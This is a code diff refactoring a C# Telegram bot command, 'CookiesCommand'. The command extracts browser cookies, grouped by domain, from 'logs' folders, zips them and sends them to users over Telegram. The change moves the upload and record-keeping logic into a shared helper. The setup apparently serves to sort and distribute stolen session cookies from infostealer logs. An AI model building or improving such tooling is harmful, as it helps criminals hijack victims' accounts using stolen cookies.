@@ -1,6 +1,4 @@
-using System.Net;
 using Core.Models.Configs;
-using Core.Models.Extensions;
 using Core.Parsers;
 using Microsoft.EntityFrameworkCore;
 using TelegramBot.Data;
@@ -10,7 +8,6 @@ using TelegramBot.Services;
 using TL;
 using WTelegram;
 
-using File = TelegramBot.Data.File;
 using User = TL.User;
 
 namespace TelegramBot.Commands.Main;
@@ -26,8 +23,6 @@ public class CookiesCommand(Client client, AppDbContext context, ParsingConfig c
     {
         if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not
             { } logsname) return;
-        
-        // TODO extract into method
 
         if (await TrySendUploadedAsync(user, logsname))
             return;
@@ -80,29 +75,12 @@ public class CookiesCommand(Client client, AppDbContext context, ParsingConfig c
             if (!Directory.Exists(dir)) return;
         }
 
-        var files = await ParseCookies(dir).ToListAsync();
-        
         await client.EditMessage(peer, messageId, $"Cookies\n{logsname} successfully processed");
-        
-        var messages = await client.SendAlbumAsync(peer,
-            files
-                .Select(x => new InputMediaUploadedDocument(x, "application/zip"))
-                .ToArray(),
-            caption: $"#Cookies\n{logsname}",
-            entities: 
-            [
-                new MessageEntityHashtag
-                {
-                    length = "#Cookies".Length,
-                    offset = 0
-                }
-            ]
-        );
 
-        await SaveFilesData(messages, logsname);
+        await data.SendFilesAsync(peer, ParseCookies(dir).ToEnumerable(), "Cookies", logsname);
     }
 
-    private IAsyncEnumerable<InputFileBase> ParseCookies(string logs) =>
+    private IAsyncEnumerable<string> ParseCookies(string logs) =>
         cfgParse.Cookies.CookiesFromLogs(logs)
                 .ToAsyncEnumerable()
                 .SelectAwait(async x => 
@@ -111,25 +89,5 @@ public class CookiesCommand(Client client, AppDbContext context, ParsingConfig c
                         "cookies",
                         x.Key.Domains.First(),
                         x.Value.ToArray(),
-                        "Cookies"))
-                .SelectAwait(async path => await client.UploadFileAsync(path));
-
-    private async Task SaveFilesData(Message[] messages, string logsname)
-    {
-        var medias = messages
-                     .Select(x => (MessageMediaDocument)x.media)
-                     .Select(x => (Document)x.document);
-
-        await context.AddRangeAsync(medias.Select(x => new File
-        {
-            Id = x.id,
-            AccessHash = x.access_hash,
-            FileReference = x.file_reference,
-            Type = x.Filename,
-            Category = "Cookies",
-            LogsName = logsname
-        }));
-
-        await context.SaveChangesAsync();
-    }
+                        "Cookies"));
 }
